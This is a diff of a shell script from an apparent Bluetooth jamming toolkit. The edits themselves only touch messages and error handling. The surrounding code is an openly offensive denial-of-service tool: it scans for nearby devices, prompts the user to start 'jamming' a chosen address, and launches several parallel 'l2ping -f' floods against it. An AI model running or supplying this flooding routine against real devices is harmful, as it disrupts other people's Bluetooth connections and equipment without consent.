@@ -40,7 +40,7 @@ echo ""
 
 echo -e "\033[0;36m[*] - SCANNING FOR BLUETOOTH DEVICES - [*]$nc"
 echo -e ""
-echo -e "\033[1;33m[+] Scanning [\033[0;35mClose the Windows to Stop$nc]..."
+echo -e "\033[1;33m[+] Scanning \e[0m[\033[0;35mManually Close the Window to Stop$nc]..."
 xterm -hold -e 'while [ 1 ]; do hcitool scan ;done' &
 scanner_pid=$!
 
@@ -48,9 +48,9 @@ jammer_pids=()
 
 cleanup() {
     echo -e "\033[1;31m[*] Stopping and Exiting...$nc"
-    kill "$scanner_pid"
+    kill "$scanner_pid" &>/dev/null
     for pid in "${jammer_pids[@]}"; do
-        kill "$pid"
+        kill "$pid" &>/dev/null
     done
     exit
 }
@@ -71,13 +71,14 @@ while true; do
 done
 
 echo -e ""
-read -p $'\033[1;33m[*] Press [ENTER] To Start Jamming. ('"$bdadd"') \033[0m'
+read -p $'\033[1;33m[*] Press [ENTER] To Start Jamming. ('"$bdadd"')'
 echo -e ""
 
 clear
 cat /usr/share/BlueJammerToolkit/core/graffiti/banner.txt
 echo ""
-echo -e "\033[0;35m[*] Jamming Started [\033[1;31mPress CTRL + C To Stop$nc]..."
+echo -e "\033[0;35m[*] Jamming Started \e[0m[\033[1;31mPress CTRL + C To Stop$nc]..."
+echo -e "\033[0;35m[!] NOTE: If the Script unexpectedly exits, That means the device you specified did not respond.$nc"
 for ((i = 1; i <= num_windows; i++)); do
     xterm -e l2ping -f "$bdadd" &
     jammer_pids+=($!)
